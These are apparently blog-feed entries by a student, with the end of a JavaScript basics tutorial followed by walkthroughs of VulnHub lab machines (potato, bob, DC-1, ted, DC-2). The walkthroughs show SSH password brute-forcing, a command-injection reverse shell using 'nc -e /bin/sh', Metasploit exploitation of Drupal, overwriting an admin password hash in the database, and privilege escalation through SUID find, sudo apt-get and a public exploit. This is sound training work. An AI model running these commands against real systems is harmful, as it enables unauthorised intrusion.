	&lt;title&gt;location.href实现页面跳转&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
	&lt;script&gt;
		alert(document.location);
		location="http://www.51cto.com";
	&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>例子9:Javascript语法-条件判断+函数</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE html&gt;

&lt;html lang="en"&gt;
&lt;head&gt;
	&lt;meta charset="UTF-8"&gt;
	&lt;title&gt;Javascript语法-条件判断+函数&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;script&gt;
	function getGrade(score){
	if (score&gt;=60){
	return "及格";
	}
	else{
	return "不及格";
	}
	}
document.write(getGrade(40));
&lt;/script&gt;	
&lt;/body&gt;
&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>例子10：条件分支</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
	&lt;meta charset="UTF-8"&gt;
	&lt;title&gt;根据分数给出等第&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
	&lt;script&gt;
function getGrade(score)
{
	if(score&gt;=90)
	{
	return "excellent";
}
else if(score&gt;=80)
{
	return "good";
}
else if(score&gt;=70){
	return "just so so";
}
else if(score&gt;=60){
	return "pass";
}
else if{
	return "not good";
}
}
document.write(getGrade(70));
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>靶机解析</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>靶机解析</tag>
      </tags>
  </entry>
  <entry>
    <title>potato解析</title>
    <url>/2023/12/10/potato%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h1><p>攻击机：kali（192.168.246.128）<br>靶机：potato（192.168.246.137）</p>
<h2 id="使用工具-指令"><a href="#使用工具-指令" class="headerlink" title="使用工具&amp;指令:"></a>使用工具&amp;指令:</h2><p>nmap （端口扫描）<br>hydra （服务端密码爆破）<br>sreachsploit （漏洞检索）<br>ssh （远程登录服务）<br>find （寻找文件）<br>scp （linux之间远程传输文件）</p>
<h1 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h1><span id="more"></span>

<p>国际惯例</p>
<pre class="line-numbers language-none"><code class="language-none">arp-scan -l //发现同网段设备
nmap -A -p- “ip地址” //扫描指定ip开放的端口 并套用默认脚本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img data-src="/2023/12/10/potato%E8%A7%A3%E6%9E%90/1.jpg" alt="1"><br>扫描发现该ip开放了80端口与7120端口 其中7120端口对应ssh服务<br>我们使用firefox访问该ip<br><img data-src="/2023/12/10/potato%E8%A7%A3%E6%9E%90/2.jpg" alt="2"><br>没有发现什么特殊的东西 f12也没有隐藏注释<br>只能将我们的注意转到ssh服务中<br>但ssh需要<strong>账号与密码</strong> 而我们目前没有<br>按照该靶机名称与网页中的土豆图片 我们推测账户名为<strong>potato</strong> 进行一次密码爆破来测试</p>
<pre class="line-numbers language-none"><code class="language-none">hydra -l “账号名” -P “密码字典文件” -V -t 4 服务://ip地址：端口
// 密码字典位于/usr/share/wordlists/rockyou.txt.gz 中 请自行解压
gzip -d /usr/share/wordlists/rockyou.txt.gz		#-d 将压缩文件解压
// -V 显示具体过程
// -t 1-64 决定线程 数字越大爆破速度越快 但占用更大<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img data-src="/2023/12/10/potato%E8%A7%A3%E6%9E%90/3.jpg" alt="3"><br><img data-src="/2023/12/10/potato%E8%A7%A3%E6%9E%90/4.jpg" alt="4"><br>结果出来了 账号 <strong>potato</strong> 的密码为 <strong>letmein</strong><br>我们赶紧来登录一下吧</p>
<pre class="line-numbers language-none"><code class="language-none">ssh 用户名@ip地址 -p 端口 //由于该端口不是默认的22 所以需要额外注释 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img data-src="/2023/12/10/potato%E8%A7%A3%E6%9E%90/5.jpg" alt="5"><br>进入后发现/root文件夹中有我们想要的文件 但当前权限不够<br>于是需要<strong>提权</strong><br>我们使用<strong>sreachsploit</strong>  来搜索<strong>该版本ubuntu的提权漏洞</strong></p>
<pre class="line-numbers language-none"><code class="language-none">sreachsploit “搜索关键词”<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img data-src="/2023/12/10/potato%E8%A7%A3%E6%9E%90/6.jpg" alt="6"><br>有了 文件名是<strong>37292.c</strong><br>不知道该文件在哪里 我们<strong>使用find命令</strong>寻找该文件</p>
<pre class="line-numbers language-none"><code class="language-none">find [路径] [匹配条件]
参数说明:
路径 是要查找的目录路径，可以是一个目录或文件名，也可以是多个路径，多个路径之间用空格分隔，如果未指定路径，则默认为当前目录。
expression 是可选参数，用于指定查找的条件，可以是文件名、文件类型、文件大小等等。
匹配条件 中可使用的选项有二三十个之多，以下列出最常用的部份：
-name pattern：按文件名查找，支持使用通配符 * 和 ?。
-type type：按文件类型查找，可以是 f（普通文件）、d（目录）、l（符号链接）等。
-size [+-]size[cwbkMG]：按文件大小查找，支持使用 + 或 - 表示大于或小于指定大小，单位可以是 c（字节）、w（字数）、b（块数）、k（KB）、M（MB）或 G（GB）。
-mtime days：按修改时间查找，支持使用 + 或 - 表示在指定天数前或后，days 是一个整数表示天数。
-user username：按文件所有者查找。
-group groupname：按文件所属组查找。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>随后<strong>使用scp命令</strong>将文件传输到靶机中</p>
<pre class="line-numbers language-none"><code class="language-none">scp [可选参数] [文件源] [传输目标] 
// -p 指定端口
// 传输目标格式为 用户名@ip:/目标文件夹<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img data-src="/2023/12/10/potato%E8%A7%A3%E6%9E%90/7.jpg" alt="7"><br>随后执行提权漏洞</p>
<pre class="line-numbers language-none"><code class="language-none">gcc 37292.c -o exp  //对刚刚下载的提权脚本进行编译
chmod +x exp //给提权脚本赋予执行权限 
./exp //运行提权脚本，运行后即可提权至root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img data-src="/2023/12/10/potato%E8%A7%A3%E6%9E%90/8.jpg" alt="8"><br><strong>阅读/root下的/proof.txt</strong><br>明显是一串<strong>md5加密</strong>后的产物 我们拿去解密网站解密 获得flag<br><img data-src="/2023/12/10/potato%E8%A7%A3%E6%9E%90/9.jpg" alt="9"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>比较小体量的靶机 主要集中在一些标准的<strong>密码爆破</strong> <strong>漏洞提权</strong> 过程中<br>那么我们下次见！</p>
</body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>靶机解析</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>靶机解析</tag>
      </tags>
  </entry>
  <entry>
    <title>每周靶机之bob</title>
    <url>/2023/12/10/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bbob/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>总之这是这周的靶机</p>
<h1 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h1><p>攻击机：kali（192.168.246.128）<br>靶机：bob （192.168.246.138）</p>
<h2 id="使用工具-指令-知识"><a href="#使用工具-指令-知识" class="headerlink" title="使用工具&amp;指令&amp;知识"></a>使用工具&amp;指令&amp;知识</h2><p>nc（瑞士军刀）<br>nmap （端口扫描）<br>gpg加密<br>命令执行漏洞</p>
<h1 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h1><span id="more"></span>

<p>首先国际惯例</p>
<pre class="line-numbers language-none"><code class="language-none">arp-scan -l //发现同网段设备
nmap -A -p- [ip地址] //扫描该ip的端口并使用默认脚本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img data-src="/2023/12/10/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bbob/3.jpg" alt="3"><br><img data-src="/2023/12/10/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bbob/4.jpg" alt="4"><br>发现了该靶机开放了21端口(对应ftp服务) 80端口(对应http服务) 25468端口(对应ssh服务)<br>我们先从http服务开启 firefox访问<br><img data-src="/2023/12/10/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bbob/5.jpg" alt="5"><br>主页与超链接经检查 没有发现什么特别的东西<br>于是我们来看看nmap在/robots.txt下扫描出的四个目录</p>
<blockquote>
<h2 id="什么是robots-txt"><a href="#什么是robots-txt" class="headerlink" title="什么是robots.txt"></a>什么是robots.txt</h2><p>robots.txt是网站管理者写给爬虫的一封信，里面描述了网站管理者不希望爬虫做的事，比如：</p>
<ul>
<li>不要访问某个文件、文件夹</li>
<li>禁止某些爬虫的访问</li>
<li>限制爬虫访问网站的频率</li>
</ul>
<p>一个自觉且善意的爬虫，应该在抓取网页之前，先阅读robots.txt，了解并执行网站管理者制定的爬虫规则。</p>
</blockquote>
<p>发现dev-shell目录中存在命令执行漏洞 既使用 <strong>管道符|</strong> 来执行nc相关命令<br>在kali上执行<code>nc -lnvp 1234 //指定1234端口开始监听</code><br><img data-src="/2023/12/10/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bbob/7.jpg" alt="7"><br>运用命令行输入<code>w|nc -e /bin/sh [kali的ip] [指定端口]</code></p>
<blockquote>
<p><img data-src="/1.png" alt="1"><br><img data-src="/2023/12/10/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bbob/2.png" alt="2"></p>
</blockquote>
<p>随后反弹shell成功<br>首先 反弹到的shell页面不是很易懂 我们可以使用<code>python -c 'import pty; pty.spawn("/bin/bash")'</code>来创建一个伪终端 方便后面的操作</p>
<blockquote>
<p><img data-src="/2023/12/10/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bbob/8.jpg" alt="8"></p>
</blockquote>
<p>根据该作者在vulnhub上的提示 flag文件位于**/<strong>目录<br>但权限不够 我们需要提权<br>先根据我们对该靶机的推测 在/home/bob中寻找线索<br>发现了一个</strong>.old_passwordfile.html**<br><img data-src="/2023/12/10/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bbob/9.jpg" alt="9"><br>查看后是<strong>两对密码和账号</strong><br>我们通过ssh链接来分别测试这些账号密码<br><img data-src="/2023/12/10/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bbob/10.jpg" alt="10"><br>很好 jc账号的密码正确 链接了靶机<br><img data-src="/2023/12/10/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bbob/11.jpg" alt="11"><br>再次在/home/bob下寻找线索 发现/Documents下有一个名为<strong>secret</strong>的文件夹和一个经过gpg加密的文件<strong>login.txt</strong> 需要密码<br>我们使用<code>ls -alR // -R 递归显示所有子文件夹和其中的文件</code>查看<br><img data-src="/2023/12/10/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bbob/13.jpg" alt="13"><br>有一个<strong>notes.sh</strong>文件 我们查看其中的内容<br><img data-src="/2023/12/10/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bbob/14.jpg" alt="14"><br>前言不搭后语的 但第一个字母都着重大写了 并且是一个单词 我们把它当作藏头诗理解 尝试解密先前的gpg文件<br><img data-src="/2023/12/10/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bbob/16.jpg" alt="16"><br><code>gpg --output [输出文件名] --decrypt [需要解密的文件名]</code><br><img data-src="/2023/12/10/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bbob/15.jpg" alt="15"><br>输入密码<strong>HARPOCRATES</strong>(你可别说这页面还挺炫)<br><img data-src="/2023/12/10/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bbob/16.jpg" alt="16"><br>解密出来又是一套账号密码<br>再次登录 发现这次的账号有<strong>sudo</strong>权限<br>那很方便了 利用sudo查看该flag文件<br><img data-src="/2023/12/10/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bbob/17.jpg" alt="17"><br>结束！</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>较为简短的靶机 结合了gpg加密与命令执行漏洞的知识<br>学无止境 期待下次的靶机</p>
</body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>靶机解析</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>靶机解析</tag>
      </tags>
  </entry>
  <entry>
    <title>靶机-DC-1</title>
    <url>/2023/12/19/%E9%9D%B6%E6%9C%BA-DC-1/</url>
    <content><![CDATA[<html><head><link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script></head><body><p><strong>下载地址：<a href="https://www.vulnhub.com/entry/dc-1,292/">https://www.vulnhub.com/entry/dc-1,292/</a></strong><br>跟随课程所写的靶机</p>
<h1 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h1><p>攻击机：kali<br>靶机：DC-1<br>网络链接均为Nat模式</p>
<h2 id="相关知识-工具"><a href="#相关知识-工具" class="headerlink" title="相关知识&amp;工具"></a>相关知识&amp;工具</h2><p>MSFconsole (漏洞检索与执行)<br>MySQL数据库相关<br>hash加密<br>find suid提权</p>
<h1 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h1><span id="more"></span>
<p><img data-src="/2023/12/19/%E9%9D%B6%E6%9C%BA-DC-1/1.jpg" alt="1"><br>惯例 <code>arp-scan -l //快速发现同网段设备</code><br><code>nmap -p- -A [ip地址] //扫描端口并调用默认脚本</code><br>发现开放了<code>对应ssh服务的22端口 对应http服务的80端口 对应rpcbind的111端口</code><br>总之我们先通过Firefox访问该ip试试看<br><img data-src="/2023/12/19/%E9%9D%B6%E6%9C%BA-DC-1/2.jpg" alt="2"><br>是个 <strong>drupal</strong> 网站 网站元素内没有隐藏要素 我们尝试通过注册账号来登录 发现无法注册<br>那就只有通过各种方式来获取账号密码登录网站了<br>我们先前说过 这是个<strong>drupal</strong>模板网站 在msfconsole中一定能找到不少漏洞<br><img data-src="/2023/12/19/%E9%9D%B6%E6%9C%BA-DC-1/3.jpg" alt="3"><br>寻找的时候我们看到这个<strong>drupal_drupageddon</strong>可以使用 于是加载</p>
<pre class="line-numbers language-kali哦哦" data-language="kali哦哦"><code class="language-kali哦哦">msfconsole //启用msfconsole
search [关键字] //以关键字为目标查找漏洞 (tips:Name中/webapp对应web漏洞 /http对应与http协议有关漏洞)
配合前者- use/info+[上一次搜索结果中漏洞对应的序号] //使用/查看对应漏洞
也可以直接use/info+[漏洞Name]
set RHOSTS [需要爆破的ip] //指定目标
run //执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>随后我们输入<strong>shell</strong> 很快就能反弹到一个shell<br><img data-src="/2023/12/19/%E9%9D%B6%E6%9C%BA-DC-1/4.jpg" alt="4"><br>使用之前介绍过的<code>python -c 'import pty; pty.spawn("/bin/bash")' //改善shell交互性</code><br>寻找flag文件 很快的就能发现根目录下的<strong>flag1.txt</strong><br><img data-src="/2023/12/19/%E9%9D%B6%E6%9C%BA-DC-1/5.jpg" alt="5"><br>它提示我说每个文件管理系统都需要一个<strong>设置文件</strong>——<strong>你也是</strong><br>也就是说接下来的内容处于这个网站的<strong>设置文件</strong>中<br>很明显**/sites/default/settings.php<strong>里有点什么玩意<br>查看后发现了 <strong>flag2</strong> 与 <strong>该网站mysql数据库的一套账号密码</strong><br>那就</strong>登录mysql**查看主网站的账号密码<br><img data-src="/2023/12/19/%E9%9D%B6%E6%9C%BA-DC-1/6.jpg" alt="6"></p>
<pre class="line-numbers language-none"><code class="language-none">这个靶机需要用到的 不太全的mysql相关指令
mysql -h localhost(登陆别的地址需要ip 本地可选 是默认的) -u [用户名] -p[密码](注意这里不用空格) //登录mysql系统
mysql命令(请注意每个命令都需要分号结尾)
show databases; //显示数据库列表
use [数据表名]; //选择数据库列表
show tables; //显示库中的数据表
select [范围,*为全部] from [表名]; //查询表内数据
update 表名 set 字段="[要修改成的值]" where 子句 order by 子句 limit 子句; //更新表内数据
WHERE 子句：可选项。用于限定表中要修改的行。若不指定，则修改表中所有的行。
ORDER BY 子句：可选项。用于限定表中的行被修改的次序。
LIMIT 子句：可选项。用于限定被修改的行数。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img data-src="/2023/12/19/%E9%9D%B6%E6%9C%BA-DC-1/7.jpg" alt="7"><br>我们这里成功登陆上了mysql 由于information_schema是mysql数据库自带 我们选中并查看<strong>drupaldb</strong>表中的数据<br>该表中有一个名为<strong>users</strong>的库 很明显 我们需要查看库中的数据<br><img data-src="/2023/12/19/%E9%9D%B6%E6%9C%BA-DC-1/8.jpg" alt="8"><br>很尴尬 由于窗口分辨率原因 数据错位了不是很好阅读<br>可以使用<strong>\G</strong>来代替查询语句的分号 来使结果垂直显示<br>tips:<strong>\g</strong>与分号作用相同 请注意大写<br><img data-src="/2023/12/19/%E9%9D%B6%E6%9C%BA-DC-1/9.jpg" alt="9"><br>这里有俩账号 一个叫<strong>admin</strong> 一个叫<strong>Fred</strong><br>那我们要登陆账号 优先一定选择权限更高的<strong>admin</strong>账号<br>更改密码 但我们可以看到pass处是被hash加密过的密码<br>想要反推的可能性不大而且费时 于是考虑替换密码<br>这里就要利用<strong>Drupal</strong>作为模板网站的特性<br>通过检索发现该网站的**/scripts<strong>目录下拥有可以生成同款hash加密密码字符的password-hash.sh文件<br>直接执行<code>./[sh文件目录] [想要加密的密码]</code>来生成<br><img data-src="/2023/12/19/%E9%9D%B6%E6%9C%BA-DC-1/10.jpg" alt="10"><br>生成一段hash码 再次进入mysql 替换数据 随后使用admin与</strong>更改过的密码<strong>来登陆网站<br><img data-src="/2023/12/19/%E9%9D%B6%E6%9C%BA-DC-1/11.jpg" alt="11"><br><img data-src="/2023/12/19/%E9%9D%B6%E6%9C%BA-DC-1/12.jpg" alt="12"><br>登陆完毕 我们查看任务栏中的</strong>Content<strong>查看过去的文章内容 发现</strong>flag3.txt**<br><img data-src="/2023/12/19/%E9%9D%B6%E6%9C%BA-DC-1/13.jpg" alt="13"><br>点击<strong>edit</strong>查看内容<br><img data-src="/2023/12/19/%E9%9D%B6%E6%9C%BA-DC-1/14.jpg" alt="14"><br>其中强调了 <strong>FIND与-EXEC</strong><br>我们于是需要介绍<strong>find suid提权</strong><br><img data-src="/2023/12/19/%E9%9D%B6%E6%9C%BA-DC-1/15.jpg" alt="15"><br>第一步的具体作用是<strong>找出拥有suid权限的指令</strong><br>在发现find拥有suid权限后 便可以通过find提权</p>
<blockquote>
<p>参考：<br><img data-src="/2023/12/19/%E9%9D%B6%E6%9C%BA-DC-1/18.jpg" alt="18"><br><img data-src="/2023/12/19/%E9%9D%B6%E6%9C%BA-DC-1/17.jpg" alt="17"></p>
</blockquote>
<p>拥有了root权限 我们便可以进一步寻找flag文件</p>
<pre class="line-numbers language-none"><code class="language-none">find / -name "*flag*.txt" //根据名称寻找根目录下文件名中含有完整flag单词的txt文件(星号代表任意字符)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img data-src="/2023/12/19/%E9%9D%B6%E6%9C%BA-DC-1/16.jpg" alt="16"><br>结束 感谢！</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>又一个过程不长但复杂的靶机<br>让我认识到了即使find这个看起来只有寻物功能的指令有了附加项后也能用于提权<br>真是奇妙<br>那么我们下次见</p>
</body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>靶机解析</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>靶机解析</tag>
      </tags>
  </entry>
  <entry>
    <title>每周靶机之ted</title>
    <url>/2023/12/19/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bted/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>上周欠的工作室的靶机<br>靶机链接： <a href="https://www.vulnhub.com/entry/ted-1,327/">https://www.vulnhub.com/entry/ted-1,327/</a></p>
<h1 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h1><p>攻击机：kali（192.168.246.128）<br>靶机：ted （192.168.246.139）</p>
<h2 id="相关工具-知识"><a href="#相关工具-知识" class="headerlink" title="相关工具&amp;知识"></a>相关工具&amp;知识</h2><p>burpsuite (渗透测试工具)<br>远程文件包含<br>sha256加密</p>
<h1 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h1><span id="more"></span>

<p>惯例发现靶机扫描端口<br><img data-src="/2023/12/19/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bted/1.jpg" alt="1"><br>发现80端口开放 通过firefox访问<br>发现主页面是一个登录页面 使用burpsuite爆破账号密码<br><img data-src="/2023/12/19/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bted/2.jpg" alt="2"><br>发现当admin为账号时弹回提示”密码hash值可能不对 请尝试hash加密”<br><img data-src="/2023/12/19/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bted/3.jpg" alt="3"><br><img data-src="/2023/12/19/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bted/4.jpg" alt="4"><br>我们确定账号名为admin 密码通过其他工具进行各种形式的加密 随后尝试爆破<br>发现密码形式为sha256加密 且字母为大写<br><img data-src="/2023/12/19/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bted/5.jpg" alt="5"><br><img data-src="/2023/12/19/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bted/6.jpg" alt="6"><br>登录进去之后发现只有一个搜索框 测试后发现存在xss漏洞<br><img data-src="/2023/12/19/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bted/7.jpg" alt="7"><br>尝试/etc/passwd发现存在远程包含漏洞 通过nc监听反弹shell<br><img data-src="/2023/12/19/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bted/8.jpg" alt="8"><br><img data-src="/2023/12/19/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bted/9.jpg" alt="9"><br>（尝试读取到当前admin的session，PHP的session保存在：/var/lib/php/session/sess_sessionid)<br><img data-src="/2023/12/19/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bted/10.jpg" alt="10"><br><img data-src="/2023/12/19/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bted/11.jpg" alt="11"><br>成功反弹到shell 发现权限为www-data 使用<code>sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh</code>提权<br><img data-src="/2023/12/19/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bted/12.jpg" alt="12"><br>完成<br><img data-src="/2023/12/19/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bted/13.jpg" alt="13"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>好短一靶机…<br>但作为复习来说也算不错<br>那我们下次见！</p>
</body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>靶机解析</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>靶机解析</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-2解析</title>
    <url>/2023/12/22/DC-2%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>这个是学校作业<br>下载地址:<a href="https://www.vulnhub.com/entry/dc-2,311/">https://www.vulnhub.com/entry/dc-2,311/</a></p>
<h1 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h1><p>攻击机：kali<br>靶机：DC-2<br>网络链接均为Nat模式</p>
<h2 id="相关知识与工具"><a href="#相关知识与工具" class="headerlink" title="相关知识与工具"></a>相关知识与工具</h2><p>wpscan (WordPress爆破用)<br>MSF console (漏洞检索&amp;调用)<br>dirb (目录扫描)<br>cewl (给url生成密码目录)<br>绕过bash限制<br>git 提权</p>
<span id="more"></span>

<h1 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h1><p>国际惯例 <code>arp-scan -l</code>发现同网段设备 使用<strong>nmap</strong>扫描ip开放的端口<br><img data-src="/2023/12/22/DC-2%E8%A7%A3%E6%9E%90/1.jpg" alt="1"><br>我们访问网站 发现无法访问<br>这里需要修改hosts文件</p>
<pre class="line-numbers language-none"><code class="language-none">vim /etc/hosts //编辑 随后另起一行 输入[靶机的ip地址] [dc-2]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这么一改 这个ip就和dc-2绑定了 重定向也不会出错<br>进入网站 发现网站是wordpress框架<br>里面翻了一遍 没啥隐藏的玩意 只有一个flag<br><img data-src="/2023/12/22/DC-2%E8%A7%A3%E6%9E%90/15.jpg" alt="15"><br>[大意:通常的密码表爆破估计不会有用 你估计得要变得cewl(特指工具名) 登录网站来获取下个flag 如果没有 就换个账号]<br>那我们现在的目标转向wordpress的账号密码获取与登录页面的寻找(毕竟有账号密码没得登录怎么办呢)<br>我们先利用<strong>msfconsole</strong>中的目录扫描工具(关键词dir_scan)</p>
<pre class="line-numbers language-none"><code class="language-none">msfconsole //启用msfconsole
search [关键字] //以关键字为目标查找漏洞 (tips:Name中/webapp对应web漏洞 /http对应与http协议有关漏洞)
配合前者- use/info+[上一次搜索结果中漏洞对应的序号] //使用/查看对应漏洞
也可以直接use/info+[漏洞Name]
set RHOSTS [需要爆破的ip] //指定目标
run //执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img data-src="/2023/12/22/DC-2%E8%A7%A3%E6%9E%90/3.jpg" alt="3"><br>找到了 wp-includes 但里面的文件实在太多 使用<strong>dirb</strong>再次扫描 缩小范围吧<br><img data-src="/2023/12/22/DC-2%E8%A7%A3%E6%9E%90/4.jpg" alt="4"></p>
<p>[-X 限制文件后缀]<br><strong>发现了登陆页面(wp-login.php)</strong></p>
<p>账号方面使用wpscan获取</p>
<blockquote>
<p>WPScan是Kali Linux默认自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括WordPress本身的漏洞、插件漏洞和主题漏洞。最新版本WPScan的数据库中包含超过18000种插件漏洞和2600种主题漏洞，并且支持最新版本的WordPress。值得注意的是，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能.</p>
<pre class="line-numbers language-常用选项" data-language="常用选项"><code class="language-常用选项">&gt;--update  更新到最新版本
&gt;--url   | -u &lt;target url&gt;  要扫描的`WordPress`站点.
&gt;--force | -f   不检查网站运行的是不是`WordPress`
&gt;--enumerate | -e [option(s)]  枚举
&gt;u 枚举用户名，默认从1-10
&gt;u[10-20] 枚举用户名，配置从10-20
&gt;--username | -U &lt;username指定爆破的用户名
&gt;--wordlist | -w &lt;wordlist指定密码字典<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</blockquote>
